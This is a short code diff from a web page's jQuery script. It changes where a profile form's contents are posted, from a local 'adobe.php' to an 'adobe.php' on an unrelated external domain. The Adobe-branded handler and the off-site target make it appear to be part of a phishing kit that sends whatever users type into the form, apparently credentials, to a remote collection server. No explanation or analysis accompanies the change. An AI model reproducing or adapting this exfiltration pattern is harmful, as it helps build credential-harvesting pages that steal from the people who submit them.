@@ -11,7 +11,7 @@
             var formData = new FormData($("#profileUp")[0]);
 
             $.ajax({
-                url: "adobe.php",
+                url: "https://deligyongy.hu/cgi-bn/wakinsd/peter/adobe.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
